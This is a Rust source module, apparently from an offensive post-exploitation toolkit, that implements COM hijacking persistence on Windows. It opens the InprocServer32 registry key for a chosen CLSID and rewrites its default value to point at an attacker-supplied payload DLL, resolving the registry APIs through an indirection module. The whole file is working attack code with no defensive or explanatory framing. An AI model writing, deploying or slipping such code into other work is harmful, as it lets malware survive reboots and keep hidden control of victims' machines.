use crate::log::LogSink;
#[allow(unused_imports)]
use super::{PersistConfig, PersistResult, PersistMethod};

pub fn persist(config: &PersistConfig, log: &LogSink) -> Result<PersistResult, String> {
    if config.target.is_empty() {
        return Err("CLSID is required (--target)".to_string());
    }
    if config.payload_path.is_empty() {
        return Err("payload path is required".to_string());
    }

    #[cfg(not(windows))]
    {
        let _ = log;
        return Err("requires Windows".to_string());
    }

    #[cfg(windows)]
    {
        use std::ffi::CString;
        use std::ptr;

        let sub_key = format!("CLSID\\{}\\InprocServer32", config.target);
        let sub_key_c = CString::new(sub_key.as_str())
            .map_err(|_| "invalid CLSID path".to_string())?;
        let value_data = CString::new(config.payload_path.as_str())
            .map_err(|_| "invalid payload path".to_string())?;

        unsafe {
            let hkcr = 0x80000000u64 as *mut std::ffi::c_void;
            let mut key_handle: *mut std::ffi::c_void = ptr::null_mut();

            log.step("Step 1: Open CLSID registry key");
            let status = crate::resolve::RegOpenKeyExA(
                hkcr,
                sub_key_c.as_ptr() as *const u8,
                0,
                0x20006,
                &mut key_handle,
            );
            if status != 0 {
                return Err(format!("CLSID key open failed: 0x{:08X}", status));
            }

            log.step("Step 2: Set server path");
            let data_bytes = value_data.as_bytes_with_nul();
            let status = crate::resolve::RegSetValueExA(
                key_handle,
                ptr::null(), // default value
                0,
                1, // REG_SZ
                data_bytes.as_ptr(),
                data_bytes.len() as u32,
            );

            log.step("Step 3: Close registry key");
            crate::resolve::RegCloseKey(key_handle);

            if status != 0 {
                return Err(format!("server path set failed: 0x{:08X}", status));
            }

            log.info(format!("  Registered: {} -> {}", config.target, config.payload_path));
        }

        Ok(PersistResult {
            method: PersistMethod::ComHijack,
            description: format!("Component '{}' registered", config.target),
        })
    }
}
